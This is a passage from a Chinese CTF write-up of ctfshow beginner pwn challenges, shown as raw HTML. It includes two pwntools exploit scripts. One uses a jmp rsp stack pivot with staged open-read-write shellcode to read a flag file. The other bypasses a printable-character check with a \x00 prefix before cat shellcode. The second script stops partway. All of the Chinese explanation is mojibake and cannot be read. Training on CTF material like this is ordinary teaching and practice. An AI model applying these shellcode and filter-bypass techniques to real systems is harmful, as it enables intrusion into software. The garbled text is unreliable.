&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/249.png&#34;
	width=&#34;786&#34;
	height=&#34;154&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/249_hu_bc25242458eb6cd9.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/249_hu_2ab8c0e2c163ef75.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;åé—¨jmp_rsp = 0x400a01&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;510&#34;
		data-flex-basis=&#34;1224px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;payload = asm(shellcraft.read(0, mmap, 0x100)) çš„æ„æ€æ˜¯å¯åŠ¨readå‡½æ•°ï¼Œå¼€å¯â€œè¯»å–æ¨¡å¼â€å¤„äºå¾…è¯»å–çŠ¶æ€ï¼Œç­‰å¾…åé¢çš„orw_shellcodeçš„å‡ºç°ï¼Œå¹¶å­˜åˆ°mmapçš„å¯è¯»å¯å†™åŒºåŸŸï¼ˆ2+4ï¼‰ï¼›&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æœ€æ­£ç¡®ç†è§£ï¼šæ‰§è¡Œåå› ç¼ºå°‘è¾“å…¥æ•°æ®ï¼ˆorw_shellcodeï¼‰æ‰è¿›å…¥ â€œç­‰å¾…çŠ¶æ€â€ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;asm(&amp;ldquo;mov rax, 0x123000; jmp rax&amp;rdquo;)çš„æ„æ€æ˜¯è·³åˆ°mmap=0x123000åŒºåŸŸï¼Œä¹Ÿå°±æ˜¯æŒ‡å‘è¿™ä¸ªåŒºåŸŸï¼Œç­‰å¾…åç»­orw_shellcodeæ³¨å…¥æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;payload = asm(shellcraft.read(0, mmap, 0x100)) + asm(&amp;ldquo;mov rax, 0x123000; jmp rax&amp;rdquo;)åŠ èµ·æ¥ä¸è¶³0x28ä¸ªå­—èŠ‚ï¼ˆ0x20+8ï¼‰ï¼Œè®©bufåˆšå¥½å……æ»¡ï¼Œä»¥ä¾¿åç»­&lt;strong&gt;å°† &lt;code&gt;rsp&lt;/code&gt; è°ƒæ•´åˆ° &lt;code&gt;buf&lt;/code&gt; ç¼“å†²åŒºèµ·å§‹åœ°å€&lt;/strong&gt;ï¼ˆbufå¤åŸï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;python3çš„expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;amd64&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;linux&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;debug&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28194&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;mmap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x123000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;jmp_rsp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x400a01&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mmap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;mov rax, 0x123000; jmp rax&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;jmp_rsp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sub rsp, 0x30; jmp rsp&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;orw_shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/ctfshow_flag&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mmap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mmap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;orw_shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;do&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pwn_070&#34;&gt;PWN_070
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå¯ä»¥å¼€å§‹ä½ çš„ä¸ªäººç§€äº† flagæ–‡ä»¶ä½ç½®ä¸º/flagã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_070&#34; &gt;PWN_070&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/250.png&#34;
	width=&#34;761&#34;
	height=&#34;230&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/250_hu_a3b3de7f37a5aec2.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/250_hu_5972e005b5612e1c.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;330&#34;
		data-flex-basis=&#34;794px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;64ä½ç¨‹åºéƒ¨åˆ†å¼€å¯RELROï¼Œå¼€å¯æ ˆä¿æŠ¤ã€‚å‘Šè¯‰äº†æˆ‘ä»¬flagæ–‡ä»¶ä½ç½®ï¼Œhintä¸­è¿˜æ˜¯è®©æˆ‘ä»¬ç”¨ORWè¯»flagã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/251.png&#34;
	width=&#34;956&#34;
	height=&#34;350&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/251_hu_9018d94ef92274a8.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/251_hu_975528a02a4c9696.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;273&#34;
		data-flex-basis=&#34;655px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å…·ä½“è§„åˆ™é€»è¾‘ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;0000-0001 è¡Œ&lt;/strong&gt;ï¼šæ£€æŸ¥ç¨‹åºæ¶æ„ï¼Œä»…å…è®¸ &lt;code&gt;ARCH_X86_64&lt;/code&gt;ï¼ˆ64 ä½ x86 æ¶æ„ï¼‰ï¼Œå¦åˆ™ç»ˆæ­¢ç¨‹åºï¼ˆè·³è½¬åˆ° 0007 è¡Œè¿”å› &lt;code&gt;KILL&lt;/code&gt;ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;0002 è¡Œ&lt;/strong&gt;ï¼šå°†å½“å‰ç³»ç»Ÿè°ƒç”¨å·åŠ è½½åˆ°å¯„å­˜å™¨ &lt;code&gt;A&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;0003-0004 è¡Œ&lt;/strong&gt;ï¼šè¿‡æ»¤ â€œéæ ‡å‡†ç³»ç»Ÿè°ƒç”¨â€ï¼ˆç¼–å· &amp;gt;= &lt;code&gt;0x40000000&lt;/code&gt; çš„å†…æ ¸ç§æœ‰è°ƒç”¨ï¼‰ï¼Œä»…å…è®¸ç¼–å·ä¸º &lt;code&gt;0xffffffff&lt;/code&gt; çš„ç‰¹æ®Šè°ƒç”¨ï¼ˆå®é™…å¾ˆå°‘ç”¨åˆ°ï¼‰ï¼Œå…¶ä»–æ­¤ç±»è°ƒç”¨ä¼šè¢«ç»ˆæ­¢ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;0005 è¡Œ&lt;/strong&gt;ï¼šæ˜ç¡®ç¦æ­¢ &lt;code&gt;execve&lt;/code&gt; ç³»ç»Ÿè°ƒç”¨ï¼ˆç¼–å· &lt;code&gt;0x3b&lt;/code&gt;ï¼Œç”¨äºæ‰§è¡Œæ–°ç¨‹åºï¼‰ï¼Œè§¦å‘æ—¶ä¼šç»ˆæ­¢ç¨‹åºã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;0006 è¡Œ&lt;/strong&gt;ï¼šå…è®¸æ‰€æœ‰æœªè¢«ä¸Šè¿°è§„åˆ™ç¦æ­¢çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆè¿”å› &lt;code&gt;ALLOW&lt;/code&gt;ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;0007 è¡Œ&lt;/strong&gt;ï¼šå¯¹è¢«ç¦æ­¢çš„æƒ…å†µï¼Œç›´æ¥ç»ˆæ­¢ç¨‹åºï¼ˆè¿”å› &lt;code&gt;KILL&lt;/code&gt;ï¼‰ã€‚&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;blockquote class=&#34;alert alert-tip&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;å®Œå…¨æ”¯æŒ**&lt;code&gt;ORW&lt;/code&gt;**æ“ä½œï¼å”¯ä¸€è¢«ç¦æ­¢çš„æ˜¯ &lt;code&gt;execve&lt;/code&gt;ï¼ˆæ‰§è¡Œæ–°ç¨‹åºï¼‰ï¼Œä½† ORW æ“ä½œä¸ä¾èµ–å®ƒï¼Œå› æ­¤å¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;è·Ÿè¿›åˆ°is_printableå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/252.png&#34;
	width=&#34;1030&#34;
	height=&#34;289&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/252_hu_e7879f82b69e6c28.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/252_hu_b6086d1ac0acec0d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;is_printable&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;356&#34;
		data-flex-basis=&#34;855px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ¡ä»¶æ˜¯ a1[i] &amp;lt;= 31 || a1[i] == 127ã€‚è¿™æ„å‘³ç€å¦‚æœå­—ç¬¦çš„ ASCII å€¼å°äºç­‰äº 31ï¼Œæˆ–è€…ç­‰äº 127ï¼Œåˆ™è®¤ä¸ºè¯¥å­—ç¬¦ä¸å¯æ‰“å°ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-error&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;å¯ä»¥åœ¨å¼€å¤´åŠ ä¸Š\x00 \xc0ï¼Œåšè¿‡pwn66ï¼Œæœ‰strlen çš„è¯å¯ä»¥æ‰¾\x00å¼€å¤´çš„shellcodeï¼Œ&lt;code&gt;\x00&lt;/code&gt; æ˜¯ ASCII ç ä¸º 0 çš„å­—ç¬¦ï¼ˆä¹Ÿå« &lt;strong&gt;ç©ºå­—ç¬¦&lt;/strong&gt;ï¼‰ï¼Œå®ƒåœ¨ C è¯­è¨€ä¸­å”¯ä¸€çš„ç‰¹æ®Šä½œç”¨æ˜¯ &lt;strong&gt;æ ‡è®°å­—ç¬¦ä¸²çš„ç»“æŸ&lt;/strong&gt;ã€‚è¿™é‡Œçš„ &lt;code&gt;\x00&lt;/code&gt; åªæ˜¯ â€œå‘Šè¯‰ &lt;code&gt;strlen&lt;/code&gt; åœæ­¢è®¡ç®—â€ï¼Œæ²¡æœ‰ä»»ä½• â€œèµ‹å€¼â€ æ“ä½œï¼ˆæ—¢ä¸ä¿®æ”¹å¯„å­˜å™¨ï¼Œä¹Ÿä¸ä¿®æ”¹å†…å­˜å€¼ï¼‰ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;è¿™æ³¢ç›´æ¥ä¸ç»™çœ‹mainçš„Cä¼ªä»£ç ï¼Œåªèƒ½çœ‹æ±‡ç¼–è¯­è¨€äº†ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘çš„python3çš„expï¼ˆæ²¡ç”¨åˆ°ORWï¼Œå·§åˆï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;amd64&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;linux&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;debug&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28114&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00\xc0&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
